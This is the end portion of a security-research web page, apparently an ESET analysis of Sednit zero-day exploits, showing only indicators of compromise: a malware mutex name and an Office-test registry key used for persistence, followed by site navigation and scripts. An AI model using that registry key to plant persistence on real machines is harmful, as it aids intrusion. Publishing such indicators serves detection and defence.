<h2><strong>Mutex</strong></h2>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882caf8625570128" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
flPGdvyhPykxGvhDOAZnU</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882caf8625570128-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882caf8625570128-1"><span class="crayon-v">flPGdvyhPykxGvhDOAZnU</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0000 seconds] -->
<p></p>
<h2><strong>Registry key</strong></h2>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b882cafa836603536" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
HKCU\Software\Microsoft\Office test\Special\Perf</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b882cafa836603536-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b882cafa836603536-1"><span class="crayon-v">HKCU</span><span class="crayon-sy">\</span><span class="crayon-v">Software</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-e">Office </span><span class="crayon-v">test</span><span class="crayon-sy">\</span><span class="crayon-v">Special</span><span class="crayon-sy">\</span><span class="crayon-v">Perf</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p></p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2017-05-09 20:00:14">9 May 2017 - 08:00PM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/fbi-cybercrime-losses-2020-ic3-623x432.jpg"
                                                         alt="Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/18/fbi-cybercrime-losses-topped-us42billion-2020/">
                                                    FBI: Cybercrime losses topped US$4.2 billion in 2020                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/03/exchange-servers-under-siege-10-apt-groups-623x432.jpg"
                                                         alt="Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/">
                                                    Exchange servers under siege from at least 10 APT groups                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/apple-m1-macs-malware-1-623x432.jpg"
                                                         alt="Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/18/malware-authors-already-taking-aim-apple-m1-macs/">
                                                    Malware authors already taking aim at Apple M1 Macs                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/02/eset-kobalos-hpc-high-performance-computing-malware-research-623x432.jpg"
                                                         alt="Sednit adds two zero&#8209;day exploits using &#8216;Trump&#8217;s attack on Syria&#8217; as a decoy">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/">
                                                    Kobalos – A complex Linux threat to high performance computing infrastructure                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F05%2F09%2Fsednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F05%2F09%2Fsednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F05%2F09%2Fsednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"93299 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=93299","disqusShortname":"welivesecurity","disqusTitle":"Sednit adds two zero\u2011day exploits using \u2018Trump\u2019s attack on Syria\u2019 as a decoy","disqusUrl":"https:\/\/www.welivesecurity.com\/2017\/05\/09\/sednit-adds-two-zero-day-exploits-using-trumps-attack-syria-decoy\/","postId":"93299"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>